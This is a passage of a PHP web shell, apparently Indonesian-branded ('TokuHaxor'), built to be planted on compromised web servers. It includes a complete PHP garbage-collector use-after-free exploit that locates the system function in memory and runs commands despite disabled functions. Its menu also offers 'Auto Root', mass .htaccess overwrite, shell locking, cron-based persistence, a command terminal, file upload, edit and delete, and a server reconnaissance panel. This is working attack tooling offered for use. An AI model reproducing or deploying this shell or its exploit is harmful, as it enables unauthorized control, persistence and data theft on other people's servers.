				echo '<p class="text-muted">[+] Defense Shell Logs: </br>' . $cronList . '</p></div></div>';
			}
		}

		function bypassGC1($cmd) {
			global $abc, $helper;

			function str2ptr(&$str, $p = 0, $s = 8) {
				$address = 0;
				for($j = $s-1; $j >= 0; $j--) {
					$address <<= 8;
					$address |= ord($str[$p+$j]);
				}
				return $address;
			}

			function ptr2str($ptr, $m = 8) {
				$out = "";
				for ($i=0; $i < $m; $i++) {
					$out .= chr($ptr & 0xff);
					$ptr >>= 8;
				}
				return $out;
			}

			function write(&$str, $p, $v, $n = 8) {
				$i = 0;
				for($i = 0; $i < $n; $i++) {
					$str[$p + $i] = chr($v & 0xff);
					$v >>= 8;
				}
			}

			function leak($addr, $p = 0, $s = 8) {
				global $abc, $helper;
				write($abc, 0x68, $addr + $p - 0x10);
				$leak = strlen($helper->a);
				if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
				return $leak;
			}

			function parse_elf($base) {
				$e_type = leak($base, 0x10, 2);

				$e_phoff = leak($base, 0x20);
				$e_phentsize = leak($base, 0x36, 2);
				$e_phnum = leak($base, 0x38, 2);

				for($i = 0; $i < $e_phnum; $i++) {
					$header = $base + $e_phoff + $i * $e_phentsize;
					$p_type  = leak($header, 0, 4);
					$p_flags = leak($header, 4, 4);
					$p_vaddr = leak($header, 0x10);
					$p_memsz = leak($header, 0x28);

					if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
						# handle pie
						$data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
						$data_size = $p_memsz;
					} else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
						$text_size = $p_memsz;
					}
				}

				if(!$data_addr || !$text_size || !$data_size)
					return false;

				return [$data_addr, $text_size, $data_size];
			}

			function get_basic_funcs($base, $elf) {
				list($data_addr, $text_size, $data_size) = $elf;
				for($i = 0; $i < $data_size / 8; $i++) {
					$leak = leak($data_addr, $i * 8);
					if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
						$deref = leak($leak);
						# 'constant' constant check
						if($deref != 0x746e6174736e6f63)
							continue;
					} else continue;

					$leak = leak($data_addr, ($i + 4) * 8);
					if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
						$deref = leak($leak);
						# 'bin2hex' constant check
						if($deref != 0x786568326e6962)
							continue;
					} else continue;

					return $data_addr + $i * 8;
				}
			}

			function get_binary_base($binary_leak) {
				$base = 0;
				$start = $binary_leak & 0xfffffffffffff000;
				for($i = 0; $i < 0x1000; $i++) {
					$addr = $start - 0x1000 * $i;
					$leak = leak($addr, 0, 7);
					if($leak == 0x10102464c457f) { # ELF header
						return $addr;
					}
				}
			}

			function get_system($basic_funcs) {
				$addr = $basic_funcs;
				do {
					$f_entry = leak($addr);
					$f_name = leak($f_entry, 0, 6);

					if($f_name == 0x6d6574737973) { # system
						return leak($addr + 8);
					}
					$addr += 0x20;
				} while($f_entry != 0);
				return false;
			}

			class ryat {
				var $ryat;
				var $chtg;
				
				function __destruct()
				{
					$this->chtg = $this->ryat;
					$this->ryat = 1;
				}
			}

			class Helper {
				public $a, $b, $c, $d;
			}

			if(stristr(PHP_OS, 'WIN')) {
				die('This PoC is for *nix systems only.');
			}

			$n_alloc = 10; # increase this value if you get segfaults

			$contiguous = [];
			for($i = 0; $i < $n_alloc; $i++)
				$contiguous[] = str_repeat('A', 79);

			$poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
			$out = unserialize($poc);
			gc_collect_cycles();

			$v = [];
			$v[0] = ptr2str(0, 79);
			unset($v);
			$abc = $out[2][0];

			$helper = new Helper;
			$helper->b = function ($x) { };

			if(strlen($abc) == 79 || strlen($abc) == 0) {
				die("UAF failed");
			}

			# leaks
			$closure_handlers = str2ptr($abc, 0);
			$php_heap = str2ptr($abc, 0x58);
			$abc_addr = $php_heap - 0xc8;

			# fake value
			write($abc, 0x60, 2);
			write($abc, 0x70, 6);

			# fake reference
			write($abc, 0x10, $abc_addr + 0x60);
			write($abc, 0x18, 0xa);

			$closure_obj = str2ptr($abc, 0x20);

			$binary_leak = leak($closure_handlers, 8);
			if(!($base = get_binary_base($binary_leak))) {
				die("Couldn't determine binary base address");
			}

			if(!($elf = parse_elf($base))) {
				die("Couldn't parse ELF header");
			}

			if(!($basic_funcs = get_basic_funcs($base, $elf))) {
				die("Couldn't get basic_functions address");
			}

			if(!($zif_system = get_system($basic_funcs))) {
				die("Couldn't get zif_system address");
			}

			# fake closure object
			$fake_obj_offset = 0xd0;
			for($i = 0; $i < 0x110; $i += 8) {
				write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
			}

			# pwn
			write($abc, 0x20, $abc_addr + $fake_obj_offset);
			write($abc, 0xd0 + 0x38, 1, 4); # internal func type
			write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

			($helper->b)($cmd);

			exit();
			echo '<div class="container-fluid language-javascript"> <div class="shell mb-3"> <pre style="font-size:15px;"><font color="green">root@TokuHaxor:~</font>#&nbsp;<font color="red">'.$_POST['cmd'].'</font><br><code>';
		}

		$scandir = $func[21]($dir);

		?>
		<!doctype html>
		<html lang="en">
		<head>
			<meta charset="utf-8">
			<meta name="viewport" content="width=device-width, initial-scale=1">
			<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
			<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
			<title><?= $shellName ?></title>
		</head>
		<body>
			<div class="container-lg">
				
				<nav class="navbar navbar-light bg-light">
					<div class="container-fluid">
						<a class="navbar-brand" href="?">
							<img src="<?= $logo ?>" alt="logo" width="30" height="24" class="d-inline-block align-text-top">
							<?= $shellName ?>
						</a>
					</div>
				</nav>
				
				<?php if (isset($_SESSION['message'])) : ?>
				<div class="alert alert-<?= $_SESSION['class'] ?> alert-dismissible fade show my-3" role="alert">
					<strong><?= $_SESSION['status'] ?>!</strong> <?= $_SESSION['message'] ?>
					<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
				</div>
				<?php endif; clear(); ?>

				<div id="tool">
					<div class="d-flex justify-content-center flex-wrap my-3">
						<a href="?" class="m-1 btn btn-outline-dark btn-sm"><i class="fa fa-home"></i> Home</a>
						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#upload" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-upload"></i> Upload</a>
						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-file-plus"></i> New File</a>
						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfolder" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> New Folder</a>
						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#bypassgc2" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Bypass PHP 7-8</a>
						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#bypassgc1" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Bypass PHP 7.0 - 7.3</a>
						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#autoroot" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Auto Root</a>
						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#massht" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Mass .htaccess</a><br>
						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#c" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Terminal</a>
						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#lockshell" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Lock Shell</a>
						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#lockfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Lock File</a>
						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#crontab" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Crontab</a>
					</div>
					

					<div class="col-md-12">
						<div class="collapse" id="lockshell" data-bs-parent="#tool">
							<div class="card card-body border-dark mb-3">
								<form method="POST">
									<input type="submit" name="lockshell" value="Mulai">
								</form>
							</div>
						</div>
					</div>

					<div class="col-md-12">
						<div class="collapse" id="lockfile" data-bs-parent="#tool">
							<div class="card card-body border-dark mb-3">
								<form method="POST">
									<label for="command">Masukkan perintah:</label>
									<input type="text" name="cmd" required>
									<input type="submit" name="lockfile" value="Submit">
								</form>
							</div>
						</div>
					</div>

					<div class="col-md-12">
						<div class="collapse" id="crontab" data-bs-parent="#tool">
							<div class="card card-body border-dark mb-3">
								<form method="POST">
									<input type="submit" name="crontab" value="Mulai">
								</form>
							</div>
						</div>
					</div>

					<div class="col-md-12">
						<div class="collapse" id="bypassgc1" data-bs-parent="#tool">
							<div class="card card-body border-dark mb-3">
								<form method="POST">
									<label for="command">Masukkan perintah:</label>
									<input type="text" name="cmd" required>
									<input type="submit" name="bypassgc1" value="Submit">
								</form>
							</div>
						</div>
					</div>
			

					<div class="col-md-12">
				<div class="collapse" id="c" data-bs-parent="#tool">
					<div class="card card-body border-dark mb-3">
						<form method="POST">
						<label for="command">Masukkan perintah:</label>
							<input type="text" name="c" required>
							<input type="submit" name="cmd" value="Eksekusi">
						</form>
					</div>
				</div>
			</div>

					<div class="col-md-12">
			<div class="collapse" id="bypassgc2" data-bs-parent="#tool">
				<div class="card card-body border-dark mb-3">
					<form method="POST">
						<input type="hidden" name="bypass" value="bypassgc2">
						<br>
						<label for="command">Masukkan perintah:</label>
						<input type="text" name="shiz" required>
						<input type="submit" name="cmd" value="Eksekusi">
					</form>
					
				</div>
			</div>
		</div>
		<div class="col-md-12">
			<div class="collapse" id="massht" data-bs-parent="#tool">
				<div class="card card-body border-dark mb-3">
					<form method="POST">
						<input type="hidden" name="bypass" value="massht">
						<br>
					<tr>
						<th style="width:15%;">Mass htcs</th>
						<th>Path</th>
					</tr>
					<tr>
						<td>Prefix</td>
						<td><input type="text" name="d_dir" style="width:268px;" value="<?= getcwd() ?>"> (Path to folder you wanna Mass htcs)</td>
					</tr>
					<tr>
						<td>isi htcs</td>
						<td><textarea style="width: 582px; height: 171px;" name="script"></textarea></td>
					</tr>
					<tr>
						<td>Action</td>
						<td><input type="submit" name="start" style="width:80px;" value="Mass!"></td>
					</tr>
				</table>
			</form>

			<?php
			if (isset($_POST["start"])) {
				kkk();
			}					
			?>
		</div>
	</div>
</div>
					<div class="row">
						<div class="col-md-12">
							<div class="collapse" id="upload" data-bs-parent="#tool">
								<div class="card card-body border-dark mb-3">
									<div class="row">
										<div class="col-md-6">
											<form action="" method="post" enctype="multipart/form-data">
												<div class="input-group">
													<input type="file" class="form-control" name="uploadfile[]" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
													<button class="btn btn-outline-dark" type="submit" id="inputGroupFileAddon04">Upload</button>
												</div>
											</form>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="col-md-12">
							<div class="collapse" id="newfile" data-bs-parent="#tool">
								<div class="card card-body border-dark mb-3">
									<div class="row">
										<div class="col-md-6">
											<form action="" method="post">
												<div class="mb-3">
													<label class="form-label">File Name</label>
													<input type="text" class="form-control" name="filename" placeholder="toku.txt">
												</div>
												<div class="mb-3">
													<label class="form-label">File Content</label>
													<textarea class="form-control" rows="5" name="filecontent"></textarea>
												</div>
												<button type="submit" class="btn btn-outline-dark">Create</button>
											</form>
										</div>
									</div>
								</div>
							</div>
						</div>
						<?php
						if ($_SERVER['REQUEST_METHOD'] === 'POST') {
							$command = $_POST['c'] ?? '';
							echo '
							<div class="row">
							 <div class="col-md-12">
								<div class="card border-dark">
									<div class="card-body">';
							if (!empty($command)) {
								$output = executeCommand($command);
								echo "<pre>{$output}</pre>";
							}
						}
						?>
						<div class="col-md-12">
							<div class="collapse" id="newfolder" data-bs-parent="#tool">
								<div class="card card-body border-dark mb-3">
									<div class="row">
										<div class="col-md-6">
											<form action="" method="post">
												<div class="mb-3">
													<label class="form-label">Folder Name</label>
													<input type="text" class="form-control" name="foldername" placeholder="toku">
												</div>
												<button type="submit" class="btn btn-outline-dark">Create</button>
											</form>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>

		
		<?php
		  	if (isset($_POST["bypass"])) {
			   $command = $_POST["shiz"];
			   echo '
	        	<div class="row">
		         <div class="col-md-12">
		        	<div class="card border-dark">
			        	<div class="card-body">';

					bypassGC2($command);
				echo '
                        </div>                  
                    </div>                 
				</div>                 
				</div><br>';
			}

			if (isset($_POST["bypassgc1"])) {
				$command = $_POST["cmd"];
				echo '
				 <div class="row">
				  <div class="col-md-12">
					 <div class="card border-dark">
						 <div class="card-body">';
 
					 bypassGC1($command);
				 echo '
						 </div>                  
					 </div>                 
				 </div>                 
				 </div><br>';
			 }

			if (isset($_POST["lockshell"])) {
				echo '
	        	<div class="row">
		         <div class="col-md-12">
		        	<div class="card border-dark">
			        	<div class="card-body">';

					lockshell2();
				echo '
                        </div>                  
                    </div>                 
				</div>                 
				</div><br>';
			}

			if (isset($_POST["lockfile"])) {
				echo '
	        	<div class="row">
		         <div class="col-md-12">
		        	<div class="card border-dark">
			        	<div class="card-body">';

					lockfile($_POST["cmd"]);
				echo '
                        </div>                  
                    </div>                 
				</div>                 
				</div><br>';
			}

			if (isset($_POST["crontab"])) {
				echo '
	        	<div class="row">
		         <div class="col-md-12">
		        	<div class="card border-dark">
			        	<div class="card-body">';

					installCronJob(__DIR__);
				echo '
                        </div>                  
                    </div>                 
				</div>                 
				</div><br>';
			}
		?>
					
				
				
				<div class="row">
					<div class="col-md-12">
						<div class="card border-dark">
							<div class="card-body">
								<h5><i class="fa fa-server"></i> Server Information </h5>
								<div class="table-responsive">
									<table class="table table-hover text-nowrap">
										<tr>
											<td>Operating System</td>
											<td> : <?= $uname ?></td>
										</tr>
										<tr>
											<td>User / Group</td>
											<td> : <?= $uid ?>[<?= $user ?>] / <?= $gid ?>[<?= $group ?>]</td>
										</tr>
										<tr>
											<td>PHP Version</td>
											<td> : <?= $func[1]() ?></td>
										</tr>
										<tr>
											<td>IP Server</td>
											<td> : <?= (!@$_SERVER["SERVER_ADDR"] ? ($func[49]("gethostbyname") ? @gethostbyname($_SERVER['SERVER_NAME']) : '????') : @$_SERVER["SERVER_ADDR"]) ?></td>
										</tr>
										<tr>
											<td>Storage</td>
											<td class="d-flex">: Total = <?= formatSize($total) ?>, Free = <?= formatSize($free) ?> [<?= $pers ?>%]</td>
										</tr>
										<tr>
											<td>Domains</td>
											<td>: <?= $dom ?></td>
										</tr>
										<tr>
											<td>Software</td>
											<td>: <?= $_SERVER['SERVER_SOFTWARE'] ?></td>
										</tr>
										<tr>
											<td>Disable Functions</td>
											<td>: <?= $show_ds ?></td>
										</tr>
										<tr>
											<td>Useful Functions</td>
											<td>: <?= rtrim($useful, ', ') ?></td>
										</tr>
										<tr>
											<td>Downloader</td>
											<td>: <?= rtrim($downloader, ', ') ?></td>
										</tr>
										<tr>
											<td colspan="2">CURL : <?= $func[49]('curl_version') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | SSH2 : <?= $func[49]('ssh2_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Magic Quotes : <?= $func[49]('get_magic_quotes_gpc') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MySQL : <?= $func[49]('mysql_get_client_info') || class_exists('mysqli') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MSSQL : <?= $func[49]('mssql_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | PostgreSQL : <?= $func[49]('pg_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Oracle : <?= $func[49]('oci_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?></td>
										</tr>
										<tr>
											<td colspan="2">Safe Mode : <?= @$func[31]('safe_mode') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Open Basedir : <?= $open_b ?> | Safe Mode Exec Dir : <?= @$func[31]('safe_mode_exec_dir') ? '<font class="text-success">'. @$func[31]('safe_mode_exec_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?> | Safe Mode Include Dir : <?= @$func[31]('safe_mode_include_dir') ? '<font class="text-success">'. @$func[31]('safe_mode_include_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?></td>
										</tr>
									</table>
								</div>
							</div>
						</div>
					</div>
					<div class="col-md-12 my-3">
						<div class="card border-dark">
							<div class="card-body">
								<h5><i class="fa fa-wave-square"></i> Path </h5>
								<nav aria-label="breadcrumb" style="--bs-breadcrumb-divider: '>';">
									<ol class="breadcrumb">
										<?php
											$numDir = count($scdir);
											foreach ($scdir as $id => $pat) {
												if ($pat == '' && $id == 0) {
													echo '<li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=/">/</a></li>';
													continue;
												}
												if ($pat == '') continue;
												if ($id + 1 == $numDir) {
													echo '<li class="breadcrumb-item active" aria-current="page">'.$pat.'</li>';
												} else {
													echo '<li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=';
													for ($i = 0; $i <= $id; $i++) {
														echo "$scdir[$i]";
														if ($i != $id) echo "/";
													}
													echo '">'.$pat.'</a></li>';
												}
											}
										?>
									</ol>
								</nav>
								[ <?= checkPerm($dir, perms($dir)) ?> ]
							</div>
						</div>
					</div>
					<div class="col-md-12" id="main">
						<div class="card border-dark overflow-auto">
							<div class="card-body">
								<h5><i class="fa fa-<?= $icon ?>"></i> <?= $title ?></h5>
								<?php if ($do == 'view') : ?>
									<h1>Anjing</h1>
								<?php else: ?>
									<?php if ($func[9]($dir)) : ?>
										<div class="table-responsive">
											<table class="table table-hover text-nowrap">
												<thead>
													<tr>
														<th>Name</th>
														<th>Type</th>
														<th>Size</th>
														<th>Last Modified</th>
														<th>Owner/Group</th>
														<th>Permission</th>
														<th>Action</th>
													</tr>
												</thead>
												<tbody>
													<?php
														foreach ($scandir as $item) :
															if (!$func[6]($dir . '/' . $item)) continue;
													?>
														<tr>
															<td>
																<?php if ($item === '..') : ?>
																<a href="?dir=<?= $func[28]($dir); ?>" class="text-decoration-none text-dark"><i class="fa fa-folder-open"></i> <?= $item ?></a>
																<?php elseif ($item === '.') :  ?>
																<a href="?dir=<?= $dir; ?>" class="text-decoration-none text-dark"><i class="fa fa-folder-open"></i> <?= $item ?></a>
																<?php else : ?>
																<a href="?dir=<?= $dir . '/' . $item ?>" class="text-decoration-none text-dark"><i class="fa fa-folder"></i> <?= checkName($item); ?></a>
																<?php endif; ?>
															</td>
															<td><?= $func[38]($item) ?></td>
															<td class="align-middle">--</td>
															<td><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
															<td><?= getowner($item) ?></td>
															<td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item))  ?></td>
															<td>
																<button type="button" class="btn btn-outline-dark btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="'.$item.'"' ?>><i class="fa fa-edit"></i></button>
																<button type="button" class="btn btn-outline-dark btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="'.$dir . '/' . $item.'"'?>><i class="fa fa-trash-alt"></i></button>
															</td>
														</tr>
													<?php endforeach; ?>
													<?php
														foreach ($scandir as $item) :
															if (!$func[7]($dir . '/' . $item)) continue;
													?>
														<tr>
															<td><a data-bs-toggle="modal" href="#viewModal" role="button" data-bs-name="<?= $item ?>" data-bs-content="<?= $func[18](@$func[14]($item)) ?>" class="text-dark text-decoration-none"><i class="fa fa-<?= geticon($item) ?>"></i> <?= checkName($item); ?></a></td>
															<td><?= checkName(($func[49]('mime_content_type') ? $func[63]($item) : $func[38]($item))) ?></td>
															<td><?= formatSize($func[10]($item)) ?></td>
															<td><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
															<td><?= getowner($item) ?></td>
															<td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item))  ?></td>
															<td>
																<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="<?= $item ?>"><i class="fa fa-edit"></i></button>
																<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#viewModal" data-bs-name="<?= $item ?>" data-bs-content="<?= $func[18](@$func[14]($item)) ?>"><i class="fa fa-file-signature"></i></button>
																<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#downloadModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-download"></i></button>
																<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-trash-alt"></i></button>
															</td>
														</tr>
													<?php endforeach; ?>
												</tbody>
											</table>
										</div>
									<?php else: ?>
										<font class="text-danger">Can't read this directory!</font>
									<?php endif; ?>
								<?php endif; ?>
							</div>
						</div>
					</div>
					<div class="col-md-12 my-3">
						<div class="card border-dark">
							<div class="card-body">
							<span class="float-end"><span class="text-muted"></span></span>
							</div>
						</div>
					</div>
				</div>
			</div>
			
			<div class="modal fade" id="renameModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered">
				<div class="modal-content">
				<div class="modal-header">
					<h5 class="modal-title" id="renameModalLabel">Rename</h5>
					<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
				</div>
				<form method="post" id="rename-form">
					<div class="modal-body">
						<div class="mb-3">
							<label for="newname" class="col-form-label">New Name:</label>
							<input type="text" class="form-control" name="newname" id="newname">
						</div>
					</div>
					<div class="modal-footer">
						<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
						<button type="submit" class="btn btn-primary">Rename</button>
					</div>
				</form>
				</div>
			</div>
			</div>
			
			<div class="modal fade" id="deleteModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
			<div class="modal-dialog modal-dialog-centered">
				<div class="modal-content">
				<div class="modal-header">
					<h5 class="modal-title" id="exampleModalToggleLabel2">Delete</h5>
					<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
				</div>
				<div class="modal-body">
					Are you sure want to delete this?
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
					<a href="" class="btn btn-danger" id="delete-confirm">Delete</a>
				</div>
				
				</div>
			</div>
			</div>
			
			<div class="modal fade" id="downloadModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
			<div class="modal-dialog modal-dialog-centered">
				<div class="modal-content">
				<div class="modal-header">
					<h5 class="modal-title" id="exampleModalToggleLabel2">Download</h5>
					<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
				</div>
				<div class="modal-body">
					Are you sure want to download this?
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
					<a href="" class="btn btn-danger" id="download-confirm">Download</a>
				</div>
				
				</div>
			</div>
			</div>
			
			<div class="modal fade" id="viewModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
			<div class="modal-dialog modal-dialog-centered">
				<div class="modal-content">
				<div class="modal-header">
					<h5 class="modal-title" id="exampleModalToggleLabel2">View</h5>
					<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
				</div>
				<form action="" method="post">
					<div class="modal-body">
						<div class="mb-3">
						<label for="content" class="col-form-label">Content:</label>
						<textarea class="form-control" id="content" rows="15" name="content"></textarea>
					</div>
					</div>
					<div class="modal-footer">
						<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
						<button type="submit" class="btn btn-primary">Save</button>
					</div>
				</form>
				</div>
			</div>
			</div>
			
			<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
			<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
			<script>
				var renameModal = document.getElementById('renameModal')
				var deleteModal = document.getElementById('deleteModal')
				var viewModal = document.getElementById('viewModal')
				var downloadModal = document.getElementById('downloadModal')
				
				renameModal.addEventListener('show.bs.modal', function (event) {
					var button = event.relatedTarget
					var name = button.getAttribute('data-bs-name')
					var modalTitle = renameModal.querySelector('.modal-title')
					var modalBodyInput = renameModal.querySelector('.modal-body input')
					var hiddenInput = document.createElement('input')
					hiddenInput.type = "hidden";
					hiddenInput.value = name;
					hiddenInput.name = "oldname";
					document.getElementById("rename-form").appendChild(hiddenInput);
					
					modalBodyInput.value = name
				})
				
				deleteModal.addEventListener('show.bs.modal', function (event) {
					var button = event.relatedTarget
					var file = button.getAttribute('data-bs-file')
					var deleteConfirm = document.getElementById('delete-confirm')
					deleteConfirm.href = '?dir=' + file + '&do=delete'
				})
				
				downloadModal.addEventListener('show.bs.modal', function (event) {
					var button = event.relatedTarget
					var file = button.getAttribute('data-bs-file')
					var downloadConfirm = document.getElementById('download-confirm')
					downloadConfirm.href = '?dir=' + file + '&do=download'
				})
				
				viewModal.addEventListener('show.bs.modal', function (event) {
					var button = event.relatedTarget
					var content = button.getAttribute('data-bs-content')
					var name = button.getAttribute('data-bs-name')
					var modalTitle = viewModal.querySelector('.modal-title')
					var modalContent = viewModal.querySelector('.modal-body textarea')
					var hiddenInput = document.createElement('input')
					hiddenInput.type = "hidden";
					hiddenInput.value = name;
					hiddenInput.name = "filename";
					viewModal.querySelector("form").appendChild(hiddenInput);

					modalTitle.textContent = 'Edit ' + name
					modalContent.value = content
				})
			</script>
		</body>
		</html>
